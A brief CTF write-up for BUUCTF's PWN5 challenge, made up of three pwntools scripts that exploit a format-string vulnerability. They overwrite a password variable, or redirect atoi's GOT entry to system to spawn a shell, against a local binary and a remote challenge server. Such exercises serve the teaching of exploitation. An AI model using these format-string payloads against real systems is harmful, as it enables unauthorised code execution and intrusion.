# BUUCTF - [第五空间2019 决赛]PWN5

## exp1

```python

from pwn import *

p = process('./pwn01')
addr = 0x0804C044
# 地址，也就相当于可打印字符串，共16byte
payload = p32(addr) + p32(addr + 1) + p32(addr + 2) + p32(addr + 3)
# 开始将前面输出的字符个数输入到地址之中，hhn是单字节输入，其偏移为10
# %10$hhn就相当于读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中
payload += b"%10$hhn%11$hhn%12$hhn%13$hhn"
p.sendline(payload)
p.sendline(str(0x10101010))
p.interactive()
```

## exp2

```python

from pwn import *

p = process('./pwn5')
elf = ELF('./pwn5')

atoi_got = elf.got['atoi']
system_plt = elf.plt['system']

payload = fmtstr_payload(10, {atoi_got: system_plt})

p.sendline(payload)
p.sendline('/bin/sh\x00')

p.interactive()

```

## exp3

```python
from pwn import *

# context.log_level = "debug"
p = remote("node3.buuoj.cn", 26486)

unk_804C044 = 0x0804C044
payload = fmtstr_payload(10, {unk_804C044: 0x1111})
p.sendlineafter("your name:", payload)
p.sendlineafter("your passwd", str(0x1111))
p.interactive()

```